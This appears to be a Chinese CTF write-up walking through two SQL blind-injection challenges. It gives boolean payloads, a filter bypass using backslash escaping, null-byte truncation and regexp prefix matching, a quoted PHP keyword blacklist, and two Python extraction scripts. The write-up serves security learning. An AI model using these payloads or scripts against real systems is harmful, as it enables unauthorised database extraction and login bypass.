# 第五天：SQL盲注实战

## 概述

今天两道综合性 SQL 注入题，把之前学的布尔盲注、绕过技巧、脚本编写串在了一起。两道题代表了两种不同的盲注思路：

- **题一**：页面有两种不同回显，利用算术运算符把布尔判断转换成页面差异 — 布尔盲注的变种，可以用二分查找脚本高效爆破。
- **题二**：黑名单封死了几乎所有常规注入关键字，需要通过反斜杠转义逃逸配合空字节截断来绕过，然后用 regexp 逐字符盲注。

---

## 题一：算术运算符布尔盲注

### 场景分析

URL 参数 `?id=` 接受不同数值，页面返回两种提示：

| id 值 | 页面回显 |
|-------|---------|
| `id=1` | `NO! Not this! Click others~~~` |
| `id=2` | `yingyingying~ Not this as well~~` |

两种回显构成了布尔盲注的基础 — 把 SQL 判断的真/假映射到不同的页面。

### 核心思路：算术运算符做布尔映射

用减法 `-` 或异或 `^` 把布尔结果（1 或 0）变成数字，从而控制最终 id 的值。

**减法方式：**

```
id = 2 - (条件)
```

- 条件为真 → `2 - 1 = 1` → 页面返回 "NO! Not this! Click others~~~"
- 条件为假 → `2 - 0 = 2` → 页面返回 "yingyingying~ Not this as well~~"

**异或方式：**

```
id = 0 ^ (条件)
```

- 条件为真 → `0 ^ 1 = 1` → 页面返回 "NO! Not this! Click others~~~"
- 条件为假 → `0 ^ 0 = 0` → 页面返回 id=0 的响应（不含 "Click"）

两种方式等价。异或的好处是不产生负数；减法的好处是假条件映射到 id=2，页面明确已知。

### 注入链路

逐层递进：库名 → 表名 → 列名 → 数据。以下 payload 以减法为例，用异或替换 `2-(...)` 为 `0^(...)` 同样有效。

**第一步：查数据库名长度**

```
id=2-(length((select(database())))=4)
```

`length(database())=4` 为真时 `2-1=1`，回显 "Click"。确认数据库名长度为 **4**。

**第二步：查数据库名（逐字符）**

```
id=2-(ord(substr(database(),1,1))=103)
```

逐字符爆破 ASCII 码：
- `ord(substr(database(),1,1))=103` → `g`
- `ord(substr(database(),2,1))=101` → `e`
- 得到数据库名：**geek**

**第三步：查表名**

先确定拼接长度：

```
id=2-(length((select(group_concat(table_name))from(information_schema.tables)where(table_schema)regexp('geek')))=1)
```

这里用 `regexp('geek')` 而不是 `=` 匹配库名。表名拼接后长度为 **16**。

逐字符爆破：

```
id=2-(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)regexp('geek')),1,1))=48)
```

得到表名：**F1naI1y**, **Flaaaaag**。

**第四步：查 Flaaaaag 表**

列名拼接长度 11，逐字符爆破得到：**id**, **fl4gawsl**。

```
id=2-(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)regexp('Flaaaaag')),1,1))=48)
```

查 flag 数据：

```
id=2-(length((select(fl4gawsl)from(Flaaaaag)where(fl4gawsl)regexp('^c')))=27)
```

长度 27，逐字符爆出：**Clever! But not this table.** — 假 flag，题目故意放的误导信息。

**第五步：查 F1naI1y 表（真正的 flag）**

列名拼接长度 20，爆破得：**id**, **username**, **password**。

password 长度 27，数据量较大需要脚本跑。查询时用 `regexp('^c')` 过滤出 flag 格式的行：

```
id=2-(length((select(password)from(F1naI1y)where(password)regexp('^c')))=27)
```

### 完整注入链路总结

```
geek (库)
├── F1naI1y (表)
│   ├── id
│   ├── username
│   └── password  ← 真正的 flag（以 'c' 开头，长度 27）
└── Flaaaaag (表)
    ├── id
    └── fl4gawsl  ← 假 flag: "Clever! But not this table."
```

### 脚本（二分查找版）

手工配合 Burp Intruder 逐字符爆破也可以完成，但用二分查找脚本效率高得多：每个字符只需约 7 次请求（log2(95)），而线性爆破平均需要 48 次。

**核心逻辑：**

payload 结构为 `id=1^(ord(substr(目标, 位置, 1))>mid)^1`：

- 内层 `ord(substr(...)) > mid` 做大小比较，返回 1（真）或 0（假），记作 X
- `1 ^ X ^ 1` 等价于 `X`（因为 `1 ^ 1 = 0`，`0 ^ X = X`），结果与 `0 ^ X` 完全相同
- X=1 时（ord > mid 成立）：id=1 → 页面包含 "Click" → 目标字符在 mid 以上，low = mid + 1
- X=0 时（ord > mid 不成立）：id=0 → 页面不含 "Click" → 目标字符在 mid 及以下，high = mid

二分收敛后 `chr(low)` 即为目标字符。

```python
import requests

url = "http://e4247cff-5d64-4353-b875-e07e478c50bf.node3.buuomid.cn/search.php"

# ---- 改这里切换目标 ----
# payload 模板，{pos} 和 {mid} 会被替换
# 查数据库
payload_tpl = "?id=1^(ord(substr((select(database())),{pos},1))>{mid})^1"
# 查表
# payload_tpl = "?id=1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),{pos},1))>{mid})^1"
# 查列
# payload_tpl = "?id=1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),{pos},1))>{mid})^1"
# 查数据
# payload_tpl = "?id=1^(ord(substr((select(group_concat(password))from(F1naI1y)),{pos},1))>{mid})^1"

flag = ""
for i in range(1, 100):
    low, high = 32, 127
    while low < high:
        mid = (low + high) // 2
        r = requests.get(url + payload_tpl.format(pos=i, mid=mid))
        if "Click" in r.text:   # id=1 → 条件为真 → 字符 > mid
            low = mid + 1
        else:                   # id=0 → 条件为假 → 字符 <= mid
            high = mid
    flag += chr(low)
    print(flag)
```

---

## 题二：黑名单绕过 + 空字节截断盲注

### 场景分析

**信息收集：**

目录扫描发现 `robots.txt`，访问后得到 `hint.php` 的路径。`hint.php` 直接给出了三段关键信息：

1. 后端 SQL 语句结构
2. 完整的黑名单过滤规则
3. 获取 flag 的条件：POST 的 `passwd` 等于 admin 的密码

**后端 SQL 语句：**

```sql
select * from users where username='' and passwd=''
```

两个参数都来自 POST，都可控。目标是让 WHERE 条件为真（即 passwd 匹配 admin 密码），使后端判断 `$_POST['passwd'] === admin's password` 通过。

**黑名单（不区分大小写）：**

```php
$black_list = "/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|
substring|select|greatest|%00|\'|=| |in|<|>|-|\.|\(\)|#|
and|if|database|users|where|table|concat|insert|join|having|sleep/i";
```

分类整理：

| 类别 | 被过滤项 |
|------|---------|
| 特殊字符 | `,` `%00` `'` ` `(空格) `-` `<` `>` `.` `()` `#` |
| SQL 关键字 | `select` `union` `where` `table` `database` `users` |
| 字符串函数 | `substr` `mid` `substring` `concat` |  — `group_concat` 中包含 `concat` 也会触发
| 比较/逻辑 | `like` `or` `and` `if` `in` `=` |
| 其他 | `sleep` `benchmark` `limit` `insert` `join` `having` `admin` |

注意 `%00` 是作为一个整体字符串被正则匹配的，`%` 单独并不过滤。这个细节是后面绕过的基础。

**未被过滤的关键东西：** `regexp`、`||`（管道符）、`/**/`（注释）、双引号 `"`、反斜杠 `\`、分号 `;`。

### 绕过思路：反斜杠转义 + 空字节截断

常规注入路线被完全封死（没有 `=`、没有 `'` 闭合、没有空格、没有 `select`），需要一条完全不同的路。

#### 第一步：反斜杠转义逃逸

`username` 传入一个反斜杠 `\`。MySQL 中 `\` 是转义字符，`\'` 会把本应闭合字符串的引号转义成普通字符。

```
POST: username=\&passwd=;%00
```

拼出的 SQL：

```sql
select * from users where username='\' and passwd=';%00'
```

关键变化：第一个 `'`（username 的开头引号）后面紧跟着 `\'`。MySQL 把 `\'` 解析为字符串中的一个普通单引号字符，**不会**在此处闭合字符串。字符串继续向后延伸，直到遇到下一个未被转义的单引号 — 也就是 passwd 值中 `;` 前面的那个 `'`。

于是：
- `username` 的实际值是 `' and passwd=`（从第一个 `'` 到 `;` 前的 `'`）
- `;` 正常结束 SQL 语句
- `%00` 之后的 `'` 原本会导致语法错误，但空字节截断了它

#### 第二步：空字节截断

`%00` 即 `0x00`（空字节）。MySQL 底层用 C 语言实现，`0x00` 是 C 字符串的终止符。

- Burp 发送 `%00` → PHP 将 POST body 进行 URL 解码 → `$_POST['passwd']` 得到 `\x00`（空字节）
- WAF 用正则 `/%00/i` 检查 `$_POST['passwd']` → `\x00` 不包含字面量字符 `%` `0` `0` → **不匹配，绕过成功**

而如果在浏览器中输入 `%00`，浏览器会把它再次 URL 编码为 `%2500`：
- `%2500` → PHP URL 解码 → `%00`（`%25`→`%`，`00` 不变）
- WAF 检查 `$_POST` 看到 `%00` → **匹配黑名单，被拦截**

这就是为什么这个 payload 必须在 Burp 中手工构造而不能在浏览器里测试。在 Burp Intruder 中爆破时也需要关闭"自动 URL 编码"选项，否则 `%00` 同样会被二次编码为 `%2500`。

#### 第三步：构造注入 payload

确定了逃逸截断可行后，在 passwd 参数中注入 regexp 条件：

```
||/**/passwd/**/regexp/**/"^{prefix}";%00
```

每个组成部分的作用：

- `||` — 逻辑 OR。前面的 username 查询条件已经闭合在字符串里（不参与布尔判断），`||` 把注入的 regexp 条件附加到 WHERE 子句
- `/**/` — 多行注释替代空格（空格被过滤）
- `regexp` — 正则匹配（未被过滤），替代 `=`
- `"^..."` — 双引号替代单引号（单引号被过滤），`^` 锚定从字符串开头匹配
- `;%00` — 分号结束语句，空字节截断尾部引号

> 注：`||` 在 MySQL 中默认是逻辑 OR。即使 `sql_mode` 开启了 `PIPES_AS_CONCAT`（管道符做字符串拼接），在这里也不影响效果。

完整 POST 体：

```
username=\&passwd=||/**/passwd/**/regexp/**/"^{}";%00
```

拼出的完整 SQL：

```sql
select * from users where username='\' and passwd='||/**/passwd/**/regexp/**/"^{}";%00'
```

解析结果：
- username 的值 = `' and passwd=`（被转义引号吞掉的中间部分）
- `|| passwd regexp "^{}"` = 注入的布尔条件（如果 passwd 匹配正则则为真）
- `;` = 语句结束
- `%00'` = 空字节截断残余引号

### 注入链路

`substr`、`mid`、`substring` 全被过滤了，无法截取子串逐字符比较。但 `regexp` 的 `^` 锚点可以实现逐字符扩展匹配：

1. 尝试 `^a` → 如果 admin 密码以 `a` 开头，regexp 匹配成功，WHERE 条件为真，页面跳转 `welcome.php`
2. 确认第一个字符后扩展为 `^ab` → 继续匹配下一个字符
3. 重复直到完整还原 admin 密码

判断依据是响应中是否出现 `welcome.php`（后端验证通过后的跳转目标）。

### 绕过技巧汇总

| 被过滤 | 绕过方式 | 原理 |
|--------|---------|------|
| 空格 | `/**/` | 多行注释充当空白分隔 |
| `'` (单引号) | `"` (双引号) | MySQL 字符串可用双引号 |
| `=` | `regexp` | 正则匹配替代等值比较 |
| `substr` / `mid` / `substring` | 逐字符扩展 `^` 前缀 | regexp 锚点匹配不需要截取子串 |
| `and` / `or` | `\|\|` | 管道符做逻辑 OR |
| `%00` (黑名单) | Burp 发送原始 `%00` | PHP 解码后变为 `\x00`，不再匹配字面量 `%00` |
| 引号闭合 | `\` 反斜杠转义 | 转义 username 的开头引号，使字符串延伸到 passwd 字段 |

### 脚本（regexp 前缀匹配版）

regexp 只能判断"是否匹配"而不能做大小比较，所以不能用二分查找。采用线性搜索 — 字符集约 80 个，平均 40 次请求/字符，在可接受范围内。

**优化点：字符集按频率排序** — 数字和英文高频字母（e/t/a/o/i/n...）排前面，提高平均命中速度。密码中常见字符（下划线、数字）优先。

```python
import requests
from urllib.parse import unquote

url = "https://af90a66c97fc07330622e14d.http-ctf2.dasctf.com//index.php"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Origin": "http://2a76f9bd-c19c-4d74-9385-12c43d39a140.node3.buuoj.cn",
    "Referer": "http://2a76f9bd-c19c-4d74-9385-12c43d39a140.node3.buuoj.cn/index.php",
}

# 字符集按频率排序：数字 → 小写高频 → 小写低频 → 大写 → 符号
s = "0123456789etasinohrdlucmfwypvbgkjqxzETASINOHRDLUCMFWYPVBGKJQXZ_{}$!@#%&()-/:;<=>[\\]`{|}~"

flag = ""
for i in range(1, 100):
    for j in s:
        prefix = flag + j
        # 改这里切换目标字段：passwd 或 username
        data = {
            "passwd": f'||/**/passwd/**/regexp/**/"^{prefix}";{unquote("%00")}',
            "username": "\\",
        }
        r = requests.post(url, data=data, headers=headers)
        if "welcome.php" in r.text:
            flag += j
            print(flag)
            break
```

---

## 两道题的对比

| 维度 | 题一 | 题二 |
|------|------|------|
| 注入类型 | 布尔盲注（页面内容差异） | 布尔盲注（HTTP 跳转差异） |
| 闭合方式 | 数字型（参数无引号包裹） | 字符型（反斜杠转义逃逸） |
| 判断依据 | 页面是否包含 "Click" | 响应是否包含 "welcome.php" |
| 搜索策略 | **二分查找** O(log n)，约 7 次/字符 | **线性搜索** O(n)，约 40 次/字符 |
| 搜索原语 | `ord(substr(...)) > mid` | `regexp "^prefix"` 锚点匹配 |
| 绕过难度 | 低（基本无过滤，可以直接用标准盲注 payload） | 高（黑名单封死几乎所有关键字，需组合多个绕过技巧） |
| 自动化 | Burp Intruder 或 Python 均可 | 必须用脚本（涉及原始 `%00` 字节，浏览器/Burp 自动编码会破坏 payload） |

---

## 小结

**技术层面：**

- 算术运算符（`-`、`^`）可以把布尔条件转换成数字差异，映射到不同的页面回显。`2 - X` 映射到 id 1/2，`0 ^ X` 映射到 id 1/0，`1 ^ X ^ 1` 等价于 `0 ^ X`，选择哪种取决于题目对运算符的过滤情况和已知的页面状态。
- 反斜杠转义 + 空字节截断的原理：`\` 把闭合引号转义成普通字符使字符串向后延伸，`;` 结束语句，`%00` 截断尾部残余字符。三条各司其职，缺一条 SQL 语法就报错。
- `%00` 绕过的本质是编码层次差：WAF 检查 PHP 解码后的 `$_POST` 值，Burp 发 `%00` → PHP 解码为 `\x00` → 不再匹配正则 `/%00/`（正则在找字面量字符 `%` `0` `0`，空字节一个都不匹配）。
- regexp 前缀匹配替代 substr：在黑名单封死所有字符串截取函数时，`^` 锚点逐字符扩展匹配是唯一可行的盲注方式。

**思路层面：**

黑名单绕过从来不是靠单个技巧，而是多个技巧的组合。题二同时用了反斜杠转义、空字节截断、`/**/` 替代空格、双引号替代单引号、regexp 替代 `=`、`||` 替代 `and/or`——每个单独都不复杂，但组合起来要求对"为什么这个能绕过"有清晰理解，而不是记住"某某关键字可以用某某替代"。
